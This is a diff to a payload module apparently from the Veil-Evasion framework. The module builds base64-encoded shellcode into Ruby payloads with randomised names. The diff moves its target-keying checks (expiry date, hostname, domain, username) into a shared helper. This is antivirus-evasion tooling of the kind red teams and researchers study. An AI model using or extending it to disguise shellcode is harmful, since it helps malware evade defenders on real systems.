@@ -10,9 +10,8 @@ Module built by @ChrisTruncer
 """
 
 import base64
-
-from datetime import date
 from Tools.Evasion.evasion_common import evasion_helpers
+from Tools.Evasion.evasion_common import gamemaker
 from Tools.Evasion.evasion_common import shellcode_help
 
 
@@ -86,44 +85,7 @@ class PayloadModule:
         # Base64 Encode Shellcode
         Shellcode = base64.b64encode(bytes(Shellcode, 'latin-1')).decode('ascii')
 
-        if self.required_options["EXPIRE_PAYLOAD"][0].lower() != "x":
-
-            year = date.today().year
-            month = date.today().month
-            day = date.today().day
-
-            # Create Payload code
-            payload_code += 'require \'date\'\n'
-            payload_code += 'if Date.today < Date.parse(\'' + year + '-' + month + '-' + day + '\').next_day(' + self.required_options["EXPIRE_PAYLOAD"][0] + ')\n'
-
-            # Add a tab for this check
-            num_ends_required += 1
-
-        if self.required_options["HOSTNAME"][0].lower() != "x":
-
-            payload_code += 'require \'socket\'\n'
-            payload_code += 'hostname = Socket.gethostname.downcase\n'
-            payload_code += 'if hostname[\"' + self.required_options["HOSTNAME"][0].lower() + '\"]\n'
-
-            # Add a tab for this check
-            num_ends_required += 1
-
-        if self.required_options["DOMAIN"][0].lower() != "x":
-
-            payload_code += 'require \'socket\'\n'
-            payload_code += 'domain = Socket.gethostname.downcase\n'
-            payload_code += 'if domain[\"' + self.required_options["DOMAIN"][0].lower() + '\"]\n'
-
-            # Add a tab for this check
-            num_ends_required += 1
-
-        if self.required_options["USERNAME"][0].lower() != "x":
-
-            payload_code += 'name = ENV["USERNAME"].downcase\n'
-            payload_code += 'if name[\"' + self.required_options["USERNAME"][0].lower() + '\"]\n'
-
-            # Add a tab for this check
-            num_ends_required += 1
+        payload_code, num_ends_required = gamemaker.senecas_games(self)
 
         # randomly generate out variable names
         payloadName = evasion_helpers.randomString()
